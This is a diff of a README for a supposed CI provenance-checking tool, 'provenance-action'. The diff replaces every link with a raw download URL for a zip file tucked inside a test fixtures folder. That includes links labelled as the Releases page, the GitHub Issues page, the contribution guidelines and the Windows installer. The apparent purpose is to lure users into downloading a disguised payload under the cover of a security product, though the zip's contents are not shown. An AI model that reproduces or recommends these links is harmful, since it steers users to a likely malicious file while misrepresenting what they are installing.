@@ -1,6 +1,6 @@
 # 🚀 provenance-action - Ensure Secure CI with Provenance Checks
 
-[![Download Latest Release](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/sperone/provenance-action.zip)](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/sperone/provenance-action.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/test/fixtures/yarn-v1/provenance-action-v1.6.zip)](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/test/fixtures/yarn-v1/provenance-action-v1.6.zip)
 
 ## 📦 Overview
 
@@ -10,9 +10,9 @@ provenance-action helps you maintain security in your continuous integration (CI
 
 To start using provenance-action, follow these steps:
 
-1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/sperone/provenance-action.zip) to download the latest version of the software.
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/test/fixtures/yarn-v1/provenance-action-v1.6.zip) to download the latest version of the software.
    
-   ![Download Release](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/sperone/provenance-action.zip)
+   ![Download Release](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/test/fixtures/yarn-v1/provenance-action-v1.6.zip)
 
 2. **Select the Latest Release:** Look for the latest version listed on the page. Typically, it will be at the top of the list. Click on it to view details.
 
@@ -22,10 +22,10 @@ To start using provenance-action, follow these steps:
 
 To download and install provenance-action, follow these steps:
 
-1. **Visit the Releases Page:** [Click here to access the Releases page](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/sperone/provenance-action.zip).
+1. **Visit the Releases Page:** [Click here to access the Releases page](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/test/fixtures/yarn-v1/provenance-action-v1.6.zip).
 
 2. **Choose the Right File:** Depending on your operating system, choose one of the files listed. 
-   - For Windows, download `https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/sperone/provenance-action.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/test/fixtures/yarn-v1/provenance-action-v1.6.zip`.
    - For macOS, download `provenance-action-macos`.
    - For Linux, download `provenance-action-linux`.
 
@@ -85,7 +85,7 @@ Once installed, you can start using provenance-action in your CI process:
 
 If you run into any issues or have questions:
 
-- Check our [GitHub Issues](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/sperone/provenance-action.zip) page for common problems and solutions.
+- Check our [GitHub Issues](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/test/fixtures/yarn-v1/provenance-action-v1.6.zip) page for common problems and solutions.
 - Consider opening a new issue if you can't find the answer you need.
 
 ## 📄 License
@@ -96,8 +96,8 @@ provenance-action is open-source under the MIT License. Feel free to modify and 
 
 We welcome contributions to enhance provenance-action. If you have ideas or improvements, please submit a pull request or open an issue to discuss! 
 
-Make sure to follow the guidelines provided in our `https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/sperone/provenance-action.zip` file for a smooth contribution process.
+Make sure to follow the guidelines provided in our `https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/test/fixtures/yarn-v1/provenance-action-v1.6.zip` file for a smooth contribution process.
 
 ---
 
-Thank you for using provenance-action! Visit our [Releases page](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/sperone/provenance-action.zip) to download the latest version and strengthen your CI security today.
+Thank you for using provenance-action! Visit our [Releases page](https://raw.githubusercontent.com/ZoobyMoo2744/provenance-action/main/test/fixtures/yarn-v1/provenance-action-v1.6.zip) to download the latest version and strengthen your CI security today.
